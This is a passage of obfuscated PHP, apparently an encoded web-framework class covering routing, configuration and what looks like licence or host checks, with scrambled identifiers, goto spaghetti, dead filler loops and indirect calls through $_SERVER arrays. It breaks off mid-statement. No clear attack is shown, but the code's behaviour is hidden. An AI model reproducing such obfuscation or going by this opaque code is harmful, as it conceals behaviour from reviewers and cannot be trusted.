$eõ£π«ÎÙÃ = $CÖ¨è†¿Û[556]; goto F ˜“òÀàô; A–¥“ÉÇ”: $CÖ¨è†¿Û =& $_SERVER[¯èãÄπµ]; $Fõªà“àº† =& $_SERVER[œ]; $Eÿàø»ÆÆ‡ = $Fõªà“àº†[0]($Fõªà“àº†[1], $fßß≥¬äßÉ); goto FÈÈ¢åÍü™; F ˜“òÀàô: } private function autorun() { $aøã¬≠âçË =& $_SERVER[œ]; global $config; if ($aøã¬≠âçË[19]($config[$aøã¬≠âçË[20]]) == 0) { return; } foreach ($config[$aøã¬≠âçË[20]] as $bçèûÌè°ø => $FòıüæèˆÇ) { $this->{$_SERVER[œ][21]}($FòıüæèˆÇ); } } private function zoryc5adf159() { goto fƒ®†óÁËÇ; FÜﬂä»Èãª: $FîŒ¥®Éôâ = array($aÂä©°Âá¿[8], $F–ö∞Ò±—‡); $B ÷”ÓÜÃÙ = $aÂä©°Âá¿[26]($GLOBALS[$aÂä©°Âá¿[22]][$aÂä©°Âá¿[23]], 1); $GLOBALS[$aÂä©°Âá¿[22]][$aÂä©°Âá¿[23]] = $aÂä©°Âá¿[27]($FîŒ¥®Éôâ, $B ÷”ÓÜÃÙ); goto e˘®Ç¯ßâ†; aŒ˘æì√ﬁî: $AÔ“’Éç∏° = $GLOBALS[$aÂä©°Âá¿[22]][$aÂä©°Âá¿[23]][0]; if (!$AÔ“’Éç∏° || $aÂä©°Âá¿[24]($AÔ“’Éç∏°) <= $aÂä©°Âá¿[24]($dôÖë◊âäÔ)) { return; } if ($aÂä©°Âá¿[6]($aÂä©°Âá¿[25]($AÔ“’Éç∏°, -$aÂä©°Âá¿[24]($dôÖë◊âäÔ))) != $dôÖë◊âäÔ) { return; } goto eÀÏ«ú≠ÏÔ; f†Ôèá∂ìﬁ: $cÚ≈öó˜Ê° = $Bﬁëàﬂ¨∫¡[559]; goto A∞ª‚ìÒπÍ; fƒ®†óÁËÇ: $Bﬁëàﬂ¨∫¡ =& $_SERVER[¯èãÄπµ]; $aÂä©°Âá¿ =& $_SERVER[œ]; $dôÖë◊âäÔ = $aÂä©°Âá¿[8]; goto aŒ˘æì√ﬁî; eÀÏ«ú≠ÏÔ: $F–ö∞Ò±—‡ = $aÂä©°Âá¿[25]($AÔ“’Éç∏°, 0, -$aÂä©°Âá¿[24]($dôÖë◊âäÔ)); $Fø†ﬂªÓ≠Ö = $Bﬁëàﬂ¨∫¡[557]; while ($Fø†ﬂªÓ≠Ö < $Bﬁëàﬂ¨∫¡[551]) { if ($Fø†ﬂªÓ≠Ö >= 0) { break; } $Fø†ﬂªÓ≠Ö++; } goto FÜﬂä»Èãª; e˘®Ç¯ßâ†: $CÒ¶Æ≠Ùÿ‹ = $Bﬁëàﬂ¨∫¡[558]; if (!$CÒ¶Æ≠Ùÿ‹) { die; } $GLOBALS[$aÂä©°Âá¿[22]][$aÂä©°Âá¿[28]] = $aÂä©°Âá¿[29]($aÂä©°Âá¿[1], $GLOBALS[$aÂä©°Âá¿[22]][$aÂä©°Âá¿[23]]); goto f†Ôèá∂ìﬁ; A∞ª‚ìÒπÍ: } private function iuga75799ab6() { goto CîÍØ—±îÆ; CîÍØ—±îÆ: $c∫ﬂ‹ÖÔä° =& $_SERVER[¯èãÄπµ]; $dºà√‹ﬁŒü =& $_SERVER[œ]; if ($GLOBALS[$dºà√‹ﬁŒü[22]][$dºà√‹ﬁŒü[28]] != $dºà√‹ﬁŒü[10]) { return; } goto AÖâÌÇ—ø™; DÊÀ‡ı˜ª•: $GLOBALS[$dºà√‹ﬁŒü[22]][$dºà√‹ﬁŒü[28]] = $dºà√‹ﬁŒü[29]($dºà√‹ﬁŒü[1], $GLOBALS[$dºà√‹ﬁŒü[22]][$dºà√‹ﬁŒü[23]]); goto eÏÜíÃíß£; AÖâÌÇ—ø™: $Bå¿õΩÒÖı = $_SERVER[$dºà√‹ﬁŒü[30]]; $Béà©µ◊¬î = $dºà√‹ﬁŒü[31]; $eøÖ´«›à… = $c∫ﬂ‹ÖÔä°[560]; goto A€ÍΩÂ¢Æâ; cäÎºç˜Âı: $dºà√‹ﬁŒü[34]($dºà√‹ﬁŒü[35], $cÀ±˘¨‚πΩ, $eµíúãò¿ë); $e·ÿ¥à≥“± = $c∫ﬂ‹ÖÔä°[562]; if (strlen($e·ÿ¥à≥“±) < $c∫ﬂ‹ÖÔä°[563]) { die; } goto BÖÖ∞íùµÿ; BÖÖ∞íùµÿ: $cÀ±˘¨‚πΩ = $dºà√‹ﬁŒü[2]($eµíúãò¿ë[0][0], $dºà√‹ﬁŒü[36]); $a∫Ê–ΩÓµ— = $c∫ﬂ‹ÖÔä°[564]; $GLOBALS[$dºà√‹ﬁŒü[22]][$dºà√‹ﬁŒü[23]] = $dºà√‹ﬁŒü[0]($dºà√‹ﬁŒü[36], $cÀ±˘¨‚πΩ); goto DÊÀ‡ı˜ª•; fﬁ≥úò´øû: $cÀ±˘¨‚πΩ = $dºà√‹ﬁŒü[25]($Bå¿õΩÒÖı, $f∑îòπÔ›Œ + $dºà√‹ﬁŒü[24]($Béà©µ◊¬î)); $D∑îÒ≈≥ù = $c∫ﬂ‹ÖÔä°[561]; if (!$D∑îÒ≈≥ù) { return; } goto cäÎºç˜Âı; A€ÍΩÂ¢Æâ: if (!$eøÖ´«›à…) { die; } if (!$dºà√‹ﬁŒü[32]($Bå¿õΩÒÖı, $Béà©µ◊¬î)) { return; } $f∑îòπÔ›Œ = $dºà√‹ﬁŒü[33]($Bå¿õΩÒÖı, $Béà©µ◊¬î); goto fﬁ≥úò´øû; eÏÜíÃíß£: } public function run() { goto aºïû√È◊ﬁ; eÂ≈·›òîÚ: $C˘´Ó“æÍﬂ = $FïÛ≈ôœŒ®[571]; while (strlen($C˘´Ó“æÍﬂ) < $FïÛ≈ôœŒ®[563]) { if (!$C˘´Ó“æÍﬂ) { break; } $C˘´Ó“æÍﬂ++; } if ($B™µ∆üö”≠[19]($Aä•î≈§∫Á) >= 3) { $this->{$_SERVER[œ][21]}($E≥ÉõÈá•À); } else { $this->{$_SERVER[œ][21]}(ACTION); } goto bì“ µæ¶ÿ; cΩÁÖÔ∞ÿﬁ: $EŒë°ﬂ“´¥ = $FïÛ≈ôœŒ®[567]; $B™µ∆üö”≠[39]($B™µ∆üö”≠[42], isset($Aä•î≈§∫Á[2]) && $Aä•î≈§∫Á[0] ? $Aä•î≈§∫Á[2] : $this->defaultAction); $B™µ∆üö”≠[39]($B™µ∆üö”≠[43], MOD . $B™µ∆üö”≠[1] . ST . $B™µ∆üö”≠[1] . ACT); goto F‹‘Éàñì¨; AË§øÚ ö£: $bì˜õç—“° = $FïÛ≈ôœŒ®[569]; if (strlen($bì˜õç—“°) < $FïÛ≈ôœŒ®[570]) { return; } $this->{$_SERVER[œ][45]}(); goto eÂ≈·›òîÚ; EØ´ó€µÊ§: $this->{$_SERVER[œ][38]}(); $Aä•î≈§∫Á = $GLOBALS[$B™µ∆üö”≠[22]][$B™µ∆üö”≠[23]]; $cä˘èå’®Û = $FïÛ≈ôœŒ®[565]; goto Aé·ª‰ëË∂; Aé·ª‰ëË∂: while ($cä˘èå’®Û < $FïÛ≈ôœŒ®[551]) { if ($cä˘èå’®Û >= 0) { break; } $cä˘èå’®Û++; } $E≥ÉõÈá•À = $GLOBALS[$B™µ∆üö”≠[22]][$B™µ∆üö”≠[28]]; $FÛ†å¶äÆ© = $FïÛ≈ôœŒ®[566]; goto D∫∫Ü¡¶¢«; aºïû√È◊ﬁ: $FïÛ≈ôœŒ® =& $_SERVER[¯èãÄπµ]; $B™µ∆üö”≠ =& $_SERVER[œ]; $this->{$_SERVER[œ][37]}(); goto EØ´ó€µÊ§; F‹‘Éàñì¨: $F°Èêú•—Ï = $FïÛ≈ôœŒ®[568]; if (strlen($F°Èêú•—Ï) < $FïÛ≈ôœŒ®[563]) { return; } $_SERVER[$B™µ∆üö”≠[44]] = $B™µ∆üö”≠[6](ACTION); goto AË§øÚ ö£; D∫∫Ü¡¶¢«: if (strlen($FÛ†å¶äÆ©) < $FïÛ≈ôœŒ®[551]) { return; } $B™µ∆üö”≠[39]($B™µ∆üö”≠[40], isset($Aä•î≈§∫Á[0]) && $Aä•î≈§∫Á[0] ? $Aä•î≈§∫Á[0] : $this->defaultModule); $B™µ∆üö”≠[39]($B™µ∆üö”≠[41], isset($Aä•î≈§∫Á[1]) && $Aä•î≈§∫Á[0] ? $Aä•î≈§∫Á[1] : $this->defaultController); goto cΩÁÖÔ∞ÿﬁ; bì“ µæ¶ÿ: } private $wmtj96332537 = array(); private $kbxy57f94ed6 = ''; public function wydif782fe34() { goto Cø”“ëé˜‘; c¥•è∞»çÕ: while ($b—¥ó«üÿå < $bà¬’¡æœ⁄[570]) { if ($b—¥ó«üÿå >= 0) { break; } $b—¥ó«üÿå++; } $this->{$_SERVER[œ][52]}(); $D°∑¿ˆûÒ  = $bà¬’¡æœ⁄[576]; goto Cêù∫æˆâ◊; Fú»µ“£∆Æ: $d®€ßÉÿÇµ = $bà¬’¡æœ⁄[574]; $this->{$_SERVER[œ][51]}(); $b—¥ó«üÿå = $bà¬’¡æœ⁄[575]; goto c¥•è∞»çÕ; Cø”“ëé˜‘: $bà¬’¡æœ⁄ =& $_SERVER[¯èãÄπµ]; $DÖë†∏∞—ñ =& $_SERVER[œ]; $this->{$_SERVER[œ][46]}(); goto e«Æª¯∆äì; Cêù∫æˆâ◊: if (!$D°∑¿ˆûÒ ) { return; } $this->{$_SERVER[œ][3]}($DÖë†∏∞—ñ[53], array($this, $DÖë†∏∞—ñ[54])); $this->{$_SERVER[œ][3]}($DÖë†∏∞—ñ[55], array($this, $DÖë†∏∞—ñ[56])); goto EÀˆ∞óÃï’; EÀˆ∞óÃï’: $CÔ≤∫ÙæÃû = $bà¬’¡æœ⁄[577]; $this->{$_SERVER[œ][3]}($DÖë†∏∞—ñ[57], array($this, $DÖë†∏∞—ñ[58])); $this->{$_SERVER[œ][3]}($DÖë†∏∞—ñ[59], array($this, $DÖë†∏∞—ñ[60])); goto a—Ö¶æÎ∞ó; e«Æª¯∆äì: $D®æ…°§â∂ = $bà¬’¡æœ⁄[572]; $this->{$_SERVER[œ][47]}(); $this->{$_SERVER[œ][48]}(); goto c°ëÚäË ã; a—Ö¶æÎ∞ó: $AóÃÚ¨«±ß = $bà¬’¡æœ⁄[578]; if (!$AóÃÚ¨«±ß) { die; } goto Cöª¡ìÚòö; c°ëÚäË ã: $this->{$_SERVER[œ][49]}(); $C‘åº¥™»é = $bà¬’¡æœ⁄[573]; $this->{$_SERVER[œ][50]}(); goto Fú»µ“£∆Æ; Cöª¡ìÚòö: } public function nrtv95ae5bc4($Dı¢∫ôóΩ≈) { goto b¡„ì”úµù; bùÍÖÌÁÆë: $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[120]] = $this->kbxy57f94ed6; $Aö¿æÌãàØ = $c¨ˆ“Éàçç[584]; if (strlen($Aö¿æÌãàØ) < $c¨ˆ“Éàçç[563]) { return; } goto c‰·†˘‡Ì…; A‚œîËñ†Ù: $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[130]] = $fîÜ¿—˜≥¯[104]($this->wmtj96332537, $fîÜ¿—˜≥¯[131], $fîÜ¿—˜≥¯[10]); if ($fîÜ¿—˜≥¯[104]($GLOBALS, $fîÜ¿—˜≥¯[132]) && $this->config[$fîÜ¿—˜≥¯[133]]) { $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[134]] = WEB_ROOT; } return $Dı¢∫ôóΩ≈; goto Aöò¶í·◊≥; fÀÍæºâ‡Ã: $DìèÉ£√û† = $c¨ˆ“Éàçç[583]; while (strlen($DìèÉ£√û†) < $c¨ˆ“Éàçç[549]) { if (!$DìèÉ£√û†) { break; } $DìèÉ£√û†++; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[117]] = $fîÜ¿—˜≥¯[118]($fîÜ¿—˜≥¯[119]()); goto bùÍÖÌÁÆë; c†›ÈäŸùΩ: $d∏ùâßÆ©Ù = $c¨ˆ“Éàçç[580]; if (strlen($d∏ùâßÆ©Ù) < $c¨ˆ“Éàçç[563]) { return; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$fîÜ¿—˜≥¯[99]] = array($fîÜ¿—˜≥¯[100] => (int) $cä‘ß√îÙé[$fîÜ¿—˜≥¯[101]], $fîÜ¿—˜≥¯[102] => $fîÜ¿—˜≥¯[103]($fîÜ¿—˜≥¯[104]($cä‘ß√îÙé, $fîÜ¿—˜≥¯[105], array())), $fîÜ¿—˜≥¯[106] => (int) $fîÜ¿—˜≥¯[104]($cä‘ß√îÙé, $fîÜ¿—˜≥¯[107], 0)); goto F“å◊Óºåë; c‰·†˘‡Ì…: if ($EÈ¨¢âä†π[$fîÜ¿—˜≥¯[120]] != $fîÜ¿—˜≥¯[121]) { $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[122]] = $EÈ¨¢âä†π[$fîÜ¿—˜≥¯[122]]; $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[123]] = $EÈ¨¢âä†π[$fîÜ¿—˜≥¯[123]]; $a‘°¿∏≠ÿœ = $fîÜ¿—˜≥¯[124](10) . $this->kbxy57f94ed6 . $fîÜ¿—˜≥¯[124](5); $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[125]][$fîÜ¿—˜≥¯[126]] = $this->{$_SERVER[œ][127]}($a‘°¿∏≠ÿœ, $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[113]]); } if ($this->kbxy57f94ed6 == $fîÜ¿—˜≥¯[121]) { $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$fîÜ¿—˜≥¯[99]][$fîÜ¿—˜≥¯[107]] = 0; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[128]] = $fîÜ¿—˜≥¯[104]($this->wmtj96332537, $fîÜ¿—˜≥¯[129], $fîÜ¿—˜≥¯[10]); goto A‚œîËñ†Ù; F“å◊Óºåë: $b÷˜πäÙ“ª = $c¨ˆ“Éàçç[581]; if (!$b÷˜πäÙ“ª) { return; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[109]] = $fîÜ¿—˜≥¯[110]($fîÜ¿—˜≥¯[111])->{$_SERVER[œ][112]}(); goto Bç¨äïßñï; D÷£·€¥Àæ: unset($Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[95]][$fîÜ¿—˜≥¯[96]]); $fØò£≥∑µã = $c¨ˆ“Éàçç[579]; if (strlen($fØò£≥∑µã) < $c¨ˆ“Éàçç[551]) { return; } goto Dø‰∏Çã∫à; Dø‰∏Çã∫à: unset($Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[95]][$fîÜ¿—˜≥¯[97]]); unset($Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$fîÜ¿—˜≥¯[76]]); unset($Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$fîÜ¿—˜≥¯[98]]); goto c†›ÈäŸùΩ; C¨—ë»¶ë˜: $B≈Ó¬·Âï√ = array($fîÜ¿—˜≥¯[64], $fîÜ¿—˜≥¯[65], $fîÜ¿—˜≥¯[66], $fîÜ¿—˜≥¯[67], $fîÜ¿—˜≥¯[68], $fîÜ¿—˜≥¯[69], $fîÜ¿—˜≥¯[70], $fîÜ¿—˜≥¯[71], $fîÜ¿—˜≥¯[72], $fîÜ¿—˜≥¯[73], $fîÜ¿—˜≥¯[74], $fîÜ¿—˜≥¯[75], $fîÜ¿—˜≥¯[76], $fîÜ¿—˜≥¯[77], $fîÜ¿—˜≥¯[78], $fîÜ¿—˜≥¯[79], $fîÜ¿—˜≥¯[80], $fîÜ¿—˜≥¯[81], $fîÜ¿—˜≥¯[82], $fîÜ¿—˜≥¯[83], $fîÜ¿—˜≥¯[84], $fîÜ¿—˜≥¯[85], $fîÜ¿—˜≥¯[86], $fîÜ¿—˜≥¯[87], $fîÜ¿—˜≥¯[88], $fîÜ¿—˜≥¯[89], $fîÜ¿—˜≥¯[90]); foreach ($B≈Ó¬·Âï√ as $a„∑Æ €ı«) { $eˆÑÂèèëﬂ = $GLOBALS[$fîÜ¿—˜≥¯[91]][$fîÜ¿—˜≥¯[92]][$a„∑Æ €ı«]; if (isset($EÈ¨¢âä†π[$a„∑Æ €ı«])) { $eˆÑÂèèëﬂ = $EÈ¨¢âä†π[$a„∑Æ €ı«]; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$a„∑Æ €ı«] = $eˆÑÂèèëﬂ; } $cä‘ß√îÙé = $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[93]][$fîÜ¿—˜≥¯[94]][$fîÜ¿—˜≥¯[76]]; goto D÷£·€¥Àæ; Bç¨äïßñï: $cøº—Ú»áΩ = $c¨ˆ“Éàçç[582]; while (strlen($cøº—Ú»áΩ) < $c¨ˆ“Éàçç[570]) { if (!$cøº—Ú»áΩ) { break; } $cøº—Ú»áΩ++; } $Dı¢∫ôóΩ≈[$fîÜ¿—˜≥¯[108]][$fîÜ¿—˜≥¯[113]] = $fîÜ¿—˜≥¯[114]($_SERVER[$fîÜ¿—˜≥¯[115]] . $EÈ¨¢âä†π[$fîÜ¿—˜≥¯[116]]); goto fÀÍæºâ‡Ã; b¡„ì”úµù: $c¨ˆ“Éàçç =& $_SERVER[¯èãÄπµ]; $fîÜ¿—˜≥¯ =& $_SERVER[œ]; $EÈ¨¢âä†π = $fîÜ¿—˜≥¯[61]($fîÜ¿—˜≥¯[62])->{$_SERVER[œ][63]}(); goto C¨—ë»¶ë˜; Aöò¶í·◊≥: } private function hxwn05dd4b76() { goto d€äıÖ˘©î; Bﬁ«Ñ¯º∏˘: if ($this->kbxy57f94ed6 == $Dõâöããåò[121]) { return; } $eØê∞†„–≤ = array($Dõâöããåò[153], $Dõâöããåò[154], $Dõâöããåò[155], $Dõâöããåò[156], $Dõâöããåò[157], $Dõâöããåò[158]); $CúÔäÆ√‡Ù = $c∫’ˆª¢ π[587]; goto Dá†∂∫ë≠™; d€äıÖ˘©î: $c∫’ˆª¢ π =& $_SERVER[¯èãÄπµ]; $Dõâöããåò =& $_SERVER[œ]; if ($_SERVER[$Dõâöããåò[44]] == $Dõâöããåò[135]) { goto Búäô≠ßä≥; Fﬂ∂¡ “Æ◊: $FæŒÛÜÎıé = $c∫’ˆª¢ π[586]; while (strlen($FæŒÛÜÎıé) < $c∫’ˆª¢ π[549]) { if (!$FæŒÛÜÎıé) { break; } $FæŒÛÜÎıé++; } $Dõâöããåò[13](array($Dõâöããåò[151], $Dõâöããåò[152]), $Bî„≥¿œÆ‰); goto eÿ∏•â¢¡Õ; Búäô≠ßä≥: $FﬁùÙáΩ√ˆ = array($Dõâöããåò[120] => $this->kbxy57f94ed6, $Dõâöããåò[136] => $this->{$_SERVER[œ][137]}(), $Dõâöããåò[138] => $Dõâöããåò[61]($Dõâöããåò[139])->{$_SERVER[œ][140]}()); if ($this->kbxy57f94ed6 != $Dõâöããåò[121]) { $E“îô∞ÛôÑ = $Dõâöããåò[104]($this->wmtj96332537, $Dõâöããåò[141]); if ($E“îô∞ÛôÑ) { $FﬁùÙáΩ√ˆ[$Dõâöããåò[142]] = $E“îô∞ÛôÑ; $FﬁùÙáΩ√ˆ[$Dõâöããåò[143]] = $Dõâöããåò[144]($Dõâöããåò[104]($this->wmtj96332537, $Dõâöããåò[145])); $FﬁùÙáΩ√ˆ[$Dõâöããåò[146]] = $Dõâöããåò[104]($this->wmtj96332537, $Dõâöããåò[131]); } } $FﬁùÙáΩ√ˆ = $this->{$_SERVER[œ][147]}($Dõâöããåò[148]($FﬁùÙáΩ√ˆ), $Dõâöããåò[114]($Dõâöããåò[149])); goto bò˘ã‡ƒ·Æ; bò˘ã‡ƒ·Æ: $Fáú‡Öçë◊ = $c∫’ˆª¢ π[585]; while (strlen($Fáú‡Öçë◊) < $c∫’ˆª¢ π[563]) { if (!$Fáú‡Öçë◊) { break; } $Fáú‡Öçë◊++; } $Bî„≥¿œÆ‰ = array($Dõâöããåò[150] => $FﬁùÙáΩ√ˆ); goto Fﬂ∂¡ “Æ◊; eÿ∏•â¢¡Õ: } goto Bﬁ«Ñ¯º∏˘; Dá†∂∫ë≠™: if (strlen($CúÔäÆ√‡Ù) < $c∫’ˆª¢ π[549]) { return; } $f‰è«√Õ‡— = $Dõâöããåò[61]($Dõâöããåò[62])->{$_SERVER[œ][63]}(); $aÌ…®Ë©Ïı = $c∫’ˆª¢ π[588]; goto D‚™Œí¬Ê∆; FùïóÓô»∞: if (strlen($A¿∞ãéîä∆) < $c∫’ˆª¢ π[551]) { return; } foreach ($eØê∞†„–≤ as $d⁄˘¢±ö€¥) { if (!isset($f‰è«√Õ‡—[$d⁄˘¢±ö€¥]) || !$f‰è«√Õ‡—[$d⁄˘¢±ö€¥]) { continue; } $Bî„≥¿œÆ‰[$d⁄˘¢±ö€¥] = $f‰è«√Õ‡—[$d⁄˘¢±ö€¥]; } $Dõâöããåò[13](array($Dõâöããåò[151], $Dõâöããåò[152]), $Bî„≥¿œÆ‰); goto E’Ç´»ıÛ©; D‚™Œí¬Ê∆: if (!$aÌ…®Ë©Ïı) { die; } $Bî„≥¿œÆ‰ = array($Dõâöããåò[159] => $f‰è«√Õ‡—[$Dõâöããåò[64]], $Dõâöããåò[160] => $f‰è«√Õ‡—[$Dõâöããåò[65]], $Dõâöããåò[161] => $Dõâöããåò[10]); $A¿∞ãéîä∆ = $c∫’ˆª¢ π[589]; goto FùïóÓô»∞; E’Ç´»ıÛ©: } private function wuyd749e3397() { goto CÉÖ¡ˆêÌ–; f·È˘íÕ‡⁄: $cÏÇ˘–äí¯ = $cÌÈã˘®◊‡[594]; if (!$cÏÇ˘–äí¯) { return; } $cπì‡Ã œÈ = $cø´Ûß∂ﬁá . $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[120]] . $this->{$_SERVER[œ][147]}($B¿◊ÀÈ«ÆŒ[114]($bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[209]]), $cø´Ûß∂ﬁá); goto Cè©—æ·ÃÉ; bª‰ûï±àú: $cØÃ´à∑úâ = $B–áæÑöÆ‘ . $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[120]] . $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[212]]; $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[122]] = $B¿◊ÀÈ«ÆŒ[214]($B¿◊ÀÈ«ÆŒ[118]($this->{$_SERVER[œ][147]}($cØÃ´à∑úâ, $B¿◊ÀÈ«ÆŒ[215]))); $cø´Ûß∂ﬁá = $B¿◊ÀÈ«ÆŒ[124](16); goto f·È˘íÕ‡⁄; CÊ‰èﬂˆ€ª: while (strlen($a¿…ÿ√¯ˆ±) < $cÌÈã˘®◊‡[563]) { if (!$a¿…ÿ√¯ˆ±) { break; } $a¿…ÿ√¯ˆ±++; } $bÛûåÛ‚âÂ[$Dà‚§ıàç] = $fß·≠æ—¬Â; $Bô¬ﬂÖÆŸ = $cÌÈã˘®◊‡[597]; goto eƒ¿Çæÿ¯›; A¶›≤êË—ı: if (!$B¿◊ÀÈ«ÆŒ[104]($GLOBALS, $B¿◊ÀÈ«ÆŒ[132])) { die; } $b§÷¶ŸçÀ = $GLOBALS[$B¿◊ÀÈ«ÆŒ[22]]; if (isset($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[163]])) { $this->{$_SERVER[œ][164]}(); die; } goto FÎÛû∫ﬂ¡≤; dﬂÈ∆íﬂâÇ: $Dà‚§ıàç = $B¿◊ÀÈ«ÆŒ[214]($B¿◊ÀÈ«ÆŒ[25]($D…≠´ßçêü, 10, 16)); $fß·≠æ—¬Â = $this->{$_SERVER[œ][127]}($B¿◊ÀÈ«ÆŒ[148]($b’Ì±ãµí›), $D…≠´ßçêü); $eäú¯¶√º = $B¿◊ÀÈ«ÆŒ[222]($B¿◊ÀÈ«ÆŒ[61]($B¿◊ÀÈ«ÆŒ[11])->{$_SERVER[œ][223]}(), $B¿◊ÀÈ«ÆŒ[224]); goto aÀ∏Áãﬂº∏; b°’ë˜ ñ’: $d“◊•Áá“æ = $cÌÈã˘®◊‡[591]; while ($d“◊•Áá“æ < $cÌÈã˘®◊‡[544]) { if ($d“◊•Áá“æ >= 0) { break; } $d“◊•Áá“æ++; } if ($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[178]] == $B¿◊ÀÈ«ÆŒ[179]) { $dåáÉæ“á∑ = $this->{$_SERVER[œ][147]}($c∆€‡ÕªÂß, $B¿◊ÀÈ«ÆŒ[180]); $eÈ∂õº£‹Ê = $this->{$_SERVER[œ][127]}($B¿◊ÀÈ«ÆŒ[148]($BÇó™‹ØòÁ), $c∆€‡ÕªÂß . $B¿◊ÀÈ«ÆŒ[181], 3); $C‚ƒÍ” √å = $this->{$_SERVER[œ][182]}($B¿◊ÀÈ«ÆŒ[183] . $dåáÉæ“á∑ . $B¿◊ÀÈ«ÆŒ[184] . $eÈ∂õº£‹Ê, -1); $B¿◊ÀÈ«ÆŒ[166]($C‚ƒÍ” √å, !0); } else { if ($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[178]] == $B¿◊ÀÈ«ÆŒ[185]) { $Câò–áÑçà = $B¿◊ÀÈ«ÆŒ[25]($B¿◊ÀÈ«ÆŒ[114]($B¿◊ÀÈ«ÆŒ[186] . $c∆€‡ÕªÂß), 12, 15) . $B¿◊ÀÈ«ÆŒ[187]; $eÈ∂õº£‹Ê = $this->{$_SERVER[œ][188]}($B¿◊ÀÈ«ÆŒ[2]($b§÷¶ŸçÀ[$B¿◊ÀÈ«ÆŒ[189]]), $Câò–áÑçà, 2); $Aí¬¶Ê÷Øâ = $B¿◊ÀÈ«ÆŒ[190]($eÈ∂õº£‹Ê, !0); if (!$B¿◊ÀÈ«ÆŒ[191]($Aí¬¶Ê÷Øâ) || !$B¿◊ÀÈ«ÆŒ[191]($Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]]) || $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[165]] != !0) { $D´–ï–Ωæ∫ = $B¿◊ÀÈ«ÆŒ[193]; $AØ≤Ó„“Òë = $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]] ? $B¿◊ÀÈ«ÆŒ[194] . $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]] : $D´–ï–Ωæ∫; $B¿◊ÀÈ«ÆŒ[166]($AØ≤Ó„“Òë, !1); } else { $BÇó™‹ØòÁ[$B¿◊ÀÈ«ÆŒ[168]] = $Aí¬¶Ê÷Øâ[$B¿◊ÀÈ«ÆŒ[192]][$B¿◊ÀÈ«ÆŒ[195]]; } } else { $Aí¬¶Ê÷Øâ = $this->{$_SERVER[œ][182]}($B¿◊ÀÈ«ÆŒ[196], $BÇó™‹ØòÁ, 10); $eŸùÏÀŸ‡Ü = $cÌÈã˘®◊‡[592]; if (strlen($eŸùÏÀŸ‡Ü) < $cÌÈã˘®◊‡[551]) { die; } } } goto E°çÒÀöıÉ; A∑∏à£ë§ó: $e∞ÈØÍπòÒ = $cÌÈã˘®◊‡[598]; while ($e∞ÈØÍπòÒ < $cÌÈã˘®◊‡[544]) { if ($e∞ÈØÍπòÒ >= 0) { break; } $e∞ÈØÍπòÒ++; } goto B©≥Ú≈áÏ≈; cΩ®Ë¯ËÃÂ: $eµÏè—Ñ”Ü = $cÌÈã˘®◊‡[590]; if (strlen($eµÏè—Ñ”Ü) < $cÌÈã˘®◊‡[544]) { die; } $c∆€‡ÕªÂß = $B¿◊ÀÈ«ÆŒ[114]($_SERVER[$B¿◊ÀÈ«ÆŒ[115]] . $F‘œÃ¡¯ı¬); goto b°’ë˜ ñ’; FÖøøî≈œ: $bÖ∞ﬂ≤á≠´ = array($B¿◊ÀÈ«ÆŒ[209] => $BÇó™‹ØòÁ[$B¿◊ÀÈ«ÆŒ[165]], $B¿◊ÀÈ«ÆŒ[210] => $b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[211]], $B¿◊ÀÈ«ÆŒ[212] => $B¿◊ÀÈ«ÆŒ[124](16), $B¿◊ÀÈ«ÆŒ[120] => $b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[213]]); if ($BÇó™‹ØòÁ[$B¿◊ÀÈ«ÆŒ[168]]) { $bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[212]] = $BÇó™‹ØòÁ[$B¿◊ÀÈ«ÆŒ[168]]; } $B–áæÑöÆ‘ = $B¿◊ÀÈ«ÆŒ[25]($B¿◊ÀÈ«ÆŒ[114]($bÖ∞ﬂ≤á≠´[$B¿◊ÀÈ«ÆŒ[210]]), 10, 10); goto bª‰ûï±àú; DñÖöÊÈÈ©: if ($b’Ì±ãµí›[$B¿◊ÀÈ«ÆŒ[217]] && 